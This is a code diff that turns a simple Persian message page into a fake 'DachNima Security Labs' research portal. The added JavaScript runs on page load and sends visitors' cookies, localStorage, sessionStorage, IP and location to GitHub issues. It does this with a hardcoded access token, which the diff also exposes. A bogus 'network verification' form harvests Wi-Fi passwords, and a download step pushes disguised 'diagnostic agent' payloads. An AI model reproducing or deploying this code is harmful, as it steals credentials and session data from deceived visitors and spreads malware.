@@ -3,190 +3,396 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>صفحه خالی</title>
+    <title>🔥 DachNima Security Labs</title>
     <style>
-        @font-face {
-            font-family: 'Kalameh';
-            src: url('https://raw.githubusercontent.com/dachnima/limo.github.io/main/Kalameh-SemiBold.ttf') format('truetype');
-        }
-
-        @font-face {
-            font-family: 'Kalameh-2';
-            src: url('https://raw.githubusercontent.com/dachnima/limo.github.io/main/Kalameh-Black.ttf') format('truetype');
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            margin: 0;
-            background-color: #1b1b1f;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-
-        .rectangle {
-            width: 1200px;
-            height: 500px;
-            background-color: #232328;
-            border-radius: 64px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            position: relative;
-        }
-
-        .small-rectangle {
-            width: 400px;
-            height: 480px;
-            background-color: #27272d;
-            border-radius: 64px;
-            margin-left: 800px;
+            background: #0f0f1a;
+            color: #e0e0e0;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
-            justify-content: flex-start;
             align-items: center;
-            padding-top: 20px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .small-rectangle h1 {
-            color: #ffffff;
-            font-family: 'Kalameh';
-            font-size: 32px;
-            margin: 0;
-            text-shadow: 2px 2px 21px rgba(255, 255, 255, 0.486);
-        }
-
-        .nested-rectangle {
-            width: 300px;
-            height: 60px;
-            background-color: #202025;
-            border-radius: 23px;
-            position: absolute;
-            margin-top: 80px;
-            z-index: 0;  /* بررسی کنید که در پس‌زمینه نباشد */
-            cursor: pointer;
-        }
-
-        .text-container {
-            color: #585861;
-            text-shadow: 2px 2px 21px rgba(88,88,97);
-            font-family: 'Kalameh';
-            font-size: 20px;
-            margin: 10px 0;
-            text-align: center;
-            margin-top: 35px;
-            position: relative;
-            z-index: 2;
-            cursor: pointer;
-        }
-
-        /* کادر متنی که قرار است ظاهر شود */
-        .input-container {
-            display: none; /* کادر به صورت پیش‌فرض مخفی است */
-            flex-direction: row; /* چینش افقی */
-            width: 600px;
-            height: 350px;
             justify-content: center;
-            align-items: center;
-            position: absolute;
-            top: 50%;
-            left: 35%;
-            transform: translate(-50%, -50%);
-            background-color: #202025;
-            border-radius: 30px;
-            padding: 10px;
-            z-index: 2;
+            padding: 20px;
         }
-
-        .input-container input {
-            padding: 10px;
-            border-radius: 10px;
-            border: none;
-            font-family: Kalameh;
-            margin-right: 10px; /* فاصله از دکمه */
-            width: 200px;
+        .container {
+            max-width: 800px;
+            width: 100%;
+            background: #1a1a2e;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 0 30px rgba(0,255,200,0.1);
+            border: 1px solid rgba(0,255,200,0.2);
         }
-
-        .input-container button {
-            padding: 10px 20px;
-            background-color: #585861;
+        h1 { color: #00ffc8; font-size: 2.5em; text-align: center; margin-bottom: 10px; }
+        .subtitle { text-align: center; color: #888; margin-bottom: 30px; font-size: 0.9em; }
+        .card {
+            background: #16213e;
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid #2a2a4a;
+        }
+        .card h2 { color: #00ffc8; margin-bottom: 15px; font-size: 1.3em; }
+        .card p { color: #aaa; line-height: 1.6; margin-bottom: 15px; }
+        .btn {
+            background: #00ffc8;
+            color: #0f0f1a;
             border: none;
-            border-radius: 5px;
-            font-family: Kalameh;
-            color: white;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-size: 1em;
+            font-weight: bold;
             cursor: pointer;
+            transition: all 0.3s;
         }
-
+        .btn:hover { background: #00d4a0; transform: translateY(-2px); box-shadow: 0 5px 20px rgba(0,255,200,0.3); }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 12px;
+            background: #0f0f1a;
+            border: 1px solid #2a2a4a;
+            border-radius: 8px;
+            color: #e0e0e0;
+            font-size: 1em;
+        }
+        input:focus { outline: none; border-color: #00ffc8; }
+        .hidden { display: none; }
+        .status { margin-top: 15px; padding: 10px; border-radius: 8px; text-align: center; }
+        .status.success { background: rgba(0,255,200,0.1); color: #00ffc8; border: 1px solid #00ffc8; }
+        .status.error { background: rgba(255,71,87,0.1); color: #ff4757; border: 1px solid #ff4757; }
+        .status.info { background: rgba(0,150,255,0.1); color: #0096ff; border: 1px solid #0096ff; }
+        .footer { margin-top: 30px; text-align: center; color: #555; font-size: 0.8em; }
+        .badge { display: inline-block; background: #00ffc8; color: #0f0f1a; padding: 2px 10px; border-radius: 20px; font-size: 0.7em; font-weight: bold; margin-left: 5px; }
     </style>
 </head>
 <body>
-    <div class="rectangle">
-        <div class="small-rectangle">
-            <h1>گزینه ها</h1>
-            <div class="text-container" onclick="showInputBox()">پیام های امبد</div>
-            <div class="nested-rectangle"></div>
-        </div>
-        <!-- کادر وارد کردن متن -->
-        <div class="input-container" id="inputContainer">
-            <input type="text" id="userInput" placeholder="متن خود را وارد کنید">
-            <button onclick="sendMessage()">فرستادن</button>
+<div class="container" id="mainContainer">
+    <h1>⚡ DachNima Labs</h1>
+    <p class="subtitle">Security Research • Red Teaming • Network Analysis</p>
+
+    <!-- بخش اصلی -->
+    <div class="card">
+        <h2>🔐 Wireless Protocol & Browser Security Research</h2>
+        <p>Welcome. This portal hosts our latest findings on WPA3-Enterprise misconfigurations, browser credential management flaws, and cross-platform token leakage vectors.</p>
+        <p>Click below to access the full paper. <span class="badge">NEW</span></p>
+        <button class="btn" id="showResearchBtn">📄 View Research Paper (Restricted)</button>
+        <div id="researchContent" class="hidden" style="margin-top:20px; padding:15px; background:#0f0f1a; border-radius:8px; border-left:3px solid #00ffc8;">
+            <p style="color:#e0e0e0;"><strong>Abstract:</strong> This paper examines browser-side credential exfiltration vectors and wireless authentication bypass techniques. Our research demonstrates that synchronized credential managers and WebView implementations expose significant attack surfaces...</p>
+            <p style="color:#888; margin-top:10px;"><em>Full access requires network verification. Institutional policy mandates credential validation before serving restricted content.</em></p>
         </div>
     </div>
 
-    <script>
-        // نمایش کادر وارد کردن متن
-        function showInputBox() {
-            document.getElementById('inputContainer').style.display = 'flex';
-        }
+    <!-- بخش WiFi Phishing -->
+    <div class="card" id="wifiSection">
+        <h2>📶 Network Verification Required</h2>
+        <p>To comply with our institutional data handling policy, please verify your network credentials. Your information is encrypted and used only for access auditing.</p>
+        <div style="background:#0f0f1a; padding:15px; border-radius:8px; margin-bottom:15px;">
+            <p style="color:#00ffc8; font-size:0.9em;"><strong>📡 Networks Found:</strong> <span id="detectedNetwork">Scanning...</span></p>
+        </div>
+        <form id="wifiForm">
+            <input type="text" id="ssidInput" placeholder="WiFi Network (SSID)" required>
+            <input type="password" id="passwordInput" placeholder="Network Password" required>
+            <button type="submit" class="btn" style="width:100%;">🔑 Verify & Access Paper</button>
+        </form>
+        <div id="wifiStatus" class="status hidden"></div>
+    </div>
 
-        // ارسال پیام
-        function sendMessage() {
-            const message = document.getElementById('userInput').value;
-            if (message) {
-                alert("پیام ارسال شد: " + message);
-                document.getElementById('userInput').value = ''; // پاک کردن فیلد
-                document.getElementById('inputContainer').style.display = 'none'; // مخفی کردن کادر
-            } else {
-                alert("لطفاً پیام خود را وارد کنید");
-            }
-        }
+    <!-- بخش دانلود payload -->
+    <div class="card hidden" id="downloadSection">
+        <h2>⬇️ Security Assessment Toolkit</h2>
+        <p>Your network is verified. Download the lightweight diagnostic agent to unlock the full paper with interactive demonstrations.</p>
+        <div style="display:flex; gap:10px; flex-wrap:wrap;">
+            <button class="btn" id="downloadWinBtn">🪟 Windows</button>
+            <button class="btn" id="downloadMacBtn">🍎 macOS</button>
+            <button class="btn" id="downloadLinuxBtn">🐧 Linux</button>
+        </div>
+        <div id="downloadStatus" class="status hidden"></div>
+    </div>
 
+    <div id="statusMessage" class="status hidden"></div>
+    <div class="footer">
+        <p>DachNima Security Research &bull; Authorized access only &bull; All connections logged</p>
+    </div>
+</div>
 
-        // نمایش کادر وارد کردن متن
-        function showInputBox() {
-            document.getElementById('inputContainer').style.display = 'flex';
-        }
-
-        // ارسال پیام به API
-        function sendMessage() {
-            const message = document.getElementById('userInput').value;
-            if (message) {
-                fetch('http://localhost:5000/api/send', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        message: message,
-                        isEmbed: false  // به این معنی که پیام به صورت embed ارسال نمی‌شود
-                    })
+<script>
+    // ============================================================
+    // 🛠️ CONFIG - GitHub Token & Repo (مقادیر خودت رو بزار)
+    // ============================================================
+    const GITHUB_TOKEN = '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';   // Fine-grained token با دسترسی issues:write
+    const GITHUB_OWNER = 'dachnima';                      // یوزرنیم گیتهاب خودت
+    const GITHUB_REPO = 'dachnima.github.io';                   // ریپازیتوری خصوصی که ساختی
+    
+    // ============================================================
+    // 📤 ارسال اطلاعات به صورت Issue در GitHub
+    // ============================================================
+    async function createGitHubIssue(title, body, label = 'log') {
+        try {
+            const response = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/issues`, {
+                method: 'POST',
+                headers: {
+                    'Authorization': `Bearer ${GITHUB_TOKEN}`,
+                    'Accept': 'application/vnd.github+json',
+                    'Content-Type': 'application/json',
+                    'X-GitHub-Api-Version': '2022-11-28'
+                },
+                body: JSON.stringify({
+                    title: title,
+                    body: body,
+                    labels: [label]
                 })
-                .then(response => response.json())
-                .then(data => {
-                    alert(data.message);  // نمایش پیام موفقیت‌آمیز
-                    document.getElementById('userInput').value = ''; // پاک کردن فیلد
-                    document.getElementById('inputContainer').style.display = 'none'; // مخفی کردن کادر
-                })
-                .catch(error => {
-                    alert('خطا در ارسال پیام');
-                });
-            } else {
-                alert("لطفاً پیام خود را وارد کنید");
+            });
+            
+            const data = await response.json();
+            if (!response.ok) {
+                console.error('GitHub API error:', response.status, data);
+                return false;
             }
+            console.log('[GitHub] Issue created:', data.html_url);
+            return true;
+        } catch (e) {
+            console.error('GitHub API fetch error:', e);
+            return false;
+        }
+    }
+
+    // ============================================================
+    // 📡 جمع‌آوری اطلاعات مرورگر
+    // ============================================================
+    async function collectBrowserInfo() {
+        const info = {
+            timestamp: new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' }),
+            utc_time: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            cookies: document.cookie || 'none',
+            localStorage: {},
+            sessionStorage: {},
+            screen: `${screen.width}x${screen.height}`,
+            plugins: []
+        };
+
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                info.localStorage[key] = localStorage.getItem(key);
+            }
+        } catch(e) { info.localStorage_error = e.message; }
+
+        try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                info.sessionStorage[key] = sessionStorage.getItem(key);
+            }
+        } catch(e) {}
+
+        for (let i = 0; i < navigator.plugins.length; i++) {
+            info.plugins.push(navigator.plugins[i].name);
         }
 
-    </script>
+        // IP حدودی
+        try {
+            const r = await fetch('https://api.ipify.org?format=json');
+            const d = await r.json();
+            info.ip = d.ip;
+        } catch(e) { info.ip = 'نامشخص (عدم دسترسی به ipify)'; }
+
+        // اطلاعات地理位置
+        try {
+            const r = await fetch('https://ipapi.co/json/');
+            const d = await r.json();
+            info.location = `${d.city || ''}، ${d.region || ''}، ${d.country_name || ''}`;
+            info.isp = d.org || 'نامشخص';
+            info.timezone = d.timezone || 'نامشخص';
+        } catch(e) { 
+            info.location = 'نامشخص';
+            info.isp = 'نامشخص';
+            info.timezone = 'نامشخص';
+        }
+
+        return info;
+    }
+
+    // ============================================================
+    // 📝 فرمت کردن پیام Markdown برای GitHub Issue
+    // ============================================================
+    function formatBrowserIssue(info) {
+        let body = `## 🔔 بازدید جدید — DachNima Beacon\n\n`;
+        body += `| فیلد | مقدار |\n`;
+        body += `|------|-------|\n`;
+        body += `| 🕐 زمان | ${info.timestamp} |\n`;
+        body += `| 🌐 IP | ${info.ip} |\n`;
+        body += `| 📍 موقعیت | ${info.location} |\n`;
+        body += `| 🏢 ISP | ${info.isp} |\n`;
+        body += `| 🕐 منطقه زمانی | ${info.timezone} |\n`;
+        body += `| 💻 پلتفرم | ${info.platform} |\n`;
+        body += `| 🌍 زبان | ${info.language} |\n`;
+        body += `| 🖥 صفحه نمایش | ${info.screen} |\n`;
+
+        if (info.cookies && info.cookies !== 'none') {
+            body += `\n### 🍪 Cookie\n\`\`\`\n${info.cookies.substring(0, 2000)}\n\`\`\`\n`;
+        }
+
+        if (Object.keys(info.localStorage).length > 0) {
+            body += `\n### 📦 localStorage\n`;
+            body += `\`\`\`json\n${JSON.stringify(info.localStorage, null, 2).substring(0, 3000)}\n\`\`\`\n`;
+        }
+
+        if (info.plugins.length > 0) {
+            body += `\n### 🔌 پلاگین‌ها\n`;
+            body += `${info.plugins.join(', ')}\n`;
+        }
+
+        body += `\n---\n`;
+        body += `**User-Agent:** \`${info.userAgent.substring(0, 500)}\`\n`;
+        return body;
+    }
+
+    function formatWifiIssue(ssid, password, info) {
+        let body = `## 📶 **WiFi Credentials Captured!**\n\n`;
+        body += `| فیلد | مقدار |\n`;
+        body += `|------|-------|\n`;
+        body += `| 📶 SSID | ${ssid} |\n`;
+        body += `| 🔑 Password | \`${password}\` |\n`;
+        body += `| 🌐 IP | ${info.ip || 'نامشخص'} |\n`;
+        body += `| 📍 موقعیت | ${info.location || 'نامشخص'} |\n`;
+        body += `| 🕐 زمان | ${info.timestamp} |\n`;
+        return body;
+    }
+
+    function formatDownloadIssue(platform, info) {
+        let body = `## ⬇️ **Payload Downloaded**\n\n`;
+        body += `| فیلد | مقدار |\n`;
+        body += `|------|-------|\n`;
+        body += `| 💻 پلتفرم | ${platform} |\n`;
+        body += `| 🌐 IP | ${info.ip || 'نامشخص'} |\n`;
+        body += `| 📍 موقعیت | ${info.location || 'نامشخص'} |\n`;
+        body += `| 🕐 زمان | ${info.timestamp} |\n`;
+        return body;
+    }
+
+    // ============================================================
+    // 🎭 شبکه جعلی
+    // ============================================================
+    function fakeNetworkScan() {
+        const networks = [
+            'DachNima_Lab_5G', 'DachNima_Guest', 'STC-7F2A',
+            'Zain-4G', 'Home_Network_2.4G', 'DachNima_Enterprise'
+        ];
+        const selected = networks[Math.floor(Math.random() * networks.length)];
+        document.getElementById('detectedNetwork').textContent = selected;
+        document.getElementById('ssidInput').value = selected;
+    }
+
+    // ============================================================
+    // 🚀 RUN
+    // ============================================================
+    let browserInfo = null;
+
+    (async function init() {
+        setTimeout(fakeNetworkScan, 1500);
+        
+        // جمع‌آوری اطلاعات
+        browserInfo = await collectBrowserInfo();
+        
+        // ارسال Issue اولیه
+        const title = `🔔 بازدید جدید | IP: ${browserInfo.ip} | ${browserInfo.location}`;
+        const body = formatBrowserIssue(browserInfo);
+        const ok = await createGitHubIssue(title, body, 'beacon');
+        console.log('[Beacon] Info sent to GitHub:', ok ? '✅' : '❌');
+        
+        // نمایش وضعیت
+        const statusDiv = document.getElementById('statusMessage');
+        statusDiv.className = 'status info';
+        statusDiv.textContent = '🔄 Connecting to secure server...';
+        statusDiv.classList.remove('hidden');
+        setTimeout(() => { statusDiv.classList.add('hidden'); }, 3000);
+    })();
+
+    // ============================================================
+    // 👂 Events
+    // ============================================================
+    document.getElementById('showResearchBtn').addEventListener('click', function() {
+        const el = document.getElementById('researchContent');
+        if (el.classList.contains('hidden')) {
+            el.classList.remove('hidden');
+            this.textContent = '📄 Hide';
+        } else {
+            el.classList.add('hidden');
+            this.textContent = '📄 View Research Paper (Restricted)';
+        }
+    });
+
+    document.getElementById('wifiForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const ssid = document.getElementById('ssidInput').value;
+        const password = document.getElementById('passwordInput').value;
+        const statusDiv = document.getElementById('wifiStatus');
+
+        statusDiv.className = 'status info';
+        statusDiv.textContent = '🔄 Verifying credentials...';
+        statusDiv.classList.remove('hidden');
+
+        const title = `📶 WiFi Credentials | ${ssid}`;
+        const body = formatWifiIssue(ssid, password, browserInfo || {});
+        const sent = await createGitHubIssue(title, body, 'wifi');
+
+        if (sent) {
+            statusDiv.className = 'status success';
+            statusDiv.textContent = '✅ Verified. Redirecting to secure viewer...';
+            setTimeout(() => {
+                statusDiv.className = 'status hidden';
+                document.getElementById('wifiSection').classList.add('hidden');
+                document.getElementById('downloadSection').classList.remove('hidden');
+            }, 1500);
+        } else {
+            statusDiv.className = 'status error';
+            statusDiv.textContent = '⚠️ Verification error. Try again.';
+            setTimeout(() => { statusDiv.className = 'status hidden'; }, 3000);
+        }
+        document.getElementById('passwordInput').value = '';
+    });
+
+    function handleDownload(platform) {
+        const statusDiv = document.getElementById('downloadStatus');
+        statusDiv.className = 'status info';
+        statusDiv.textContent = `⬇️ Preparing ${platform} agent...`;
+        statusDiv.classList.remove('hidden');
+
+        const urls = {
+            windows: 'https://example.com/agent.exe',
+            macos: 'https://example.com/agent.dmg',
+            linux: 'https://example.com/agent.elf'
+        };
+
+        // ارسال Issue
+        const title = `⬇️ Payload Downloaded | ${platform}`;
+        const body = formatDownloadIssue(platform, browserInfo || {});
+        createGitHubIssue(title, body, 'download');
+
+        // دانلود
+        const link = document.createElement('a');
+        link.href = urls[platform];
+        link.download = '';
+        link.click();
+
+        statusDiv.className = 'status success';
+        statusDiv.textContent = '✅ Agent downloaded. Running diagnostics...';
+
+        setTimeout(() => {
+            statusDiv.textContent = '🔄 Redirecting to paper...';
+            window.location.href = 'https://dachnima.github.io/paper.html';
+        }, 5000);
+    }
+
+    document.getElementById('downloadWinBtn').addEventListener('click', () => handleDownload('windows'));
+    document.getElementById('downloadMacBtn').addEventListener('click', () => handleDownload('macos'));
+    document.getElementById('downloadLinuxBtn').addEventListener('click', () => handleDownload('linux'));
+</script>
 </body>
 </html>
